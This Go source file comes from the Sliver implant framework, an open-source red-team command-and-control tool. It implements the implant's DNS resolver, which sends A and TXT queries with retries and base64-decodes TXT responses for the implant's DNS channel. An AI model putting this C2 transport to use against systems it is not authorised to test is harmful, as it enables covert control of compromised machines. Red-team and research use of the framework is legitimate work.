package dnsclient

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"crypto/rand"
	"encoding/binary"
	"errors"
	"strings"
	"time"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"github.com/bishopfox/sliver/implant/sliver/encoders"
	"github.com/miekg/dns"
)

var (
	// ErrInvalidRcode - Returned when the response code is not a success
	ErrInvalidRcode = errors.New("invalid rcode")
)

// NewGenericResolver - Instantiate a new generic resolver
func NewGenericResolver(address string, port string, retryWait time.Duration, retries int, timeout time.Duration) DNSResolver {
	if retries < 1 {
		retries = 1
	}
	return &GenericResolver{
		address:   address + ":" + port,
		retries:   retries,
		retryWait: retryWait,
		resolver: &dns.Client{
			ReadTimeout:  timeout,
			WriteTimeout: timeout,
		},
		base64: encoders.Base64{},
	}
}

// GenericResolver - Cross-platform Go DNS resolver
type GenericResolver struct {
	address   string
	retries   int
	retryWait time.Duration
	resolver  *dns.Client
	base64    encoders.Base64
}

// Address - Return the address of the resolver
func (r *GenericResolver) Address() string {
	return r.address
}

// A - Query for A records
func (r *GenericResolver) A(domain string) ([]byte, time.Duration, error) {
	var resp []byte
	var rtt time.Duration
	var err error
	for attempt := 0; attempt < r.retries; attempt++ {
		resp, rtt, err = r.a(domain)
		if err == nil {
			break
		}
		// {{if .Config.Debug}}
		log.Printf("[dns] query error: %s (retry wait: %s)", err, r.retryWait)
		// {{end}}
		time.Sleep(r.retryWait)
	}
	return resp, rtt, err
}

func (r *GenericResolver) a(domain string) ([]byte, time.Duration, error) {
	// {{if .Config.Debug}}
	log.Printf("[dns] %s->A record of %s ?", r.address, domain)
	// {{end}}
	resp, rtt, err := r.localQuery(domain, dns.TypeA)
	if err != nil {
		return nil, rtt, err
	}
	if resp.Rcode != dns.RcodeSuccess {
		// {{if .Config.Debug}}
		log.Printf("[dns] error response status: %v", resp.Rcode)
		// {{end}}
		return nil, rtt, ErrInvalidRcode
	}
	records := []byte{}
	for _, answer := range resp.Answer {
		switch answer := answer.(type) {
		case *dns.A:
			// {{if .Config.Debug}}
			log.Printf("[dns] answer (a): %v", answer.A)
			// {{end}}
			records = append(records, []byte(answer.A)...)
		}
	}
	return records, rtt, err
}

// TXT - Query for TXT records
func (r *GenericResolver) TXT(domain string) ([]byte, time.Duration, error) {
	var resp []byte
	var rtt time.Duration
	var err error
	for attempt := 0; attempt < r.retries; attempt++ {
		resp, rtt, err = r.txt(domain)
		if err == nil {
			break
		}
		// {{if .Config.Debug}}
		log.Printf("[dns] query error: %s (retry wait: %s)", err, r.retryWait)
		// {{end}}
		time.Sleep(r.retryWait)
	}
	return resp, rtt, err
}

func (r *GenericResolver) txt(domain string) ([]byte, time.Duration, error) {
	resp, rtt, err := r.localQuery(domain, dns.TypeTXT)
	if err != nil {
		return nil, rtt, err
	}
	if resp.Rcode != dns.RcodeSuccess {
		// {{if .Config.Debug}}
		log.Printf("[dns] error response status: %v", resp.Rcode)
		// {{end}}
		return nil, rtt, ErrInvalidRcode
	}

	records := ""
	for _, answer := range resp.Answer {
		switch answer := answer.(type) {
		case *dns.TXT:
			// {{if .Config.Debug}}
			log.Printf("[dns] answer (txt): %v", answer.Txt)
			// {{end}}
			records += strings.Join(answer.Txt, "")
		}
	}
	data := []byte{}
	if 0 < len(records) {
		data, err = r.base64.Decode([]byte(records))
	}
	return data, rtt, err
}

func (r *GenericResolver) localQuery(qName string, qType uint16) (*dns.Msg, time.Duration, error) {
	msg := &dns.Msg{
		MsgHdr: dns.MsgHdr{
			Id:               headerID(),
			RecursionDesired: true,
			Opcode:           dns.OpcodeQuery,
		},
	}
	msg.SetQuestion(qName, qType)
	resp, rtt, err := r.resolver.Exchange(msg, r.address)
	// {{if .Config.Debug}}
	log.Printf("[dns] rtt->%s %s (err: %v)", r.address, rtt, err)
	// {{end}}
	if err != nil {
		return nil, rtt, err
	}
	return resp, rtt, nil
}

func headerID() uint16 {
	buf := make([]byte, 2)
	rand.Read(buf)
	return binary.LittleEndian.Uint16(buf)
}
